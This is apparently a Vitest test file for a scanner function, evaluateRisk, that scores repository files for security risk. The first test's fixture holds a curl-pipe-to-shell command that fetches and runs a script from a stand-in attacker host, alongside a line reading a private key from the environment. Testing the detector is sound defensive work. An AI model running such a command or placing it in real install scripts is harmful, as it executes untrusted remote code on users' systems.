import { describe, expect, it } from "vitest";
import { evaluateRisk } from "../services/scoring.js";

describe("evaluateRisk", () => {
  it("raises risk level when high-risk patterns exist", () => {
    const result = evaluateRisk([
      {
        relativePath: "scripts/install.sh",
        content: "curl https://evil.example/s.sh | sh"
      },
      {
        relativePath: "src/keys.ts",
        content: "const k = process.env.PRIVATE_KEY"
      }
    ]);

    expect(result.score).toBeGreaterThanOrEqual(60);
    expect(result.level).toBe("yellow");
    expect(result.findings.length).toBeGreaterThan(0);
  });

  it("keeps score green for clean sample", () => {
    const result = evaluateRisk([
      {
        relativePath: "README.md",
        content: "This project provides a safe UI dashboard for reporting only."
      }
    ]);

    expect(result.score).toBe(0);
    expect(result.level).toBe("green");
  });
});
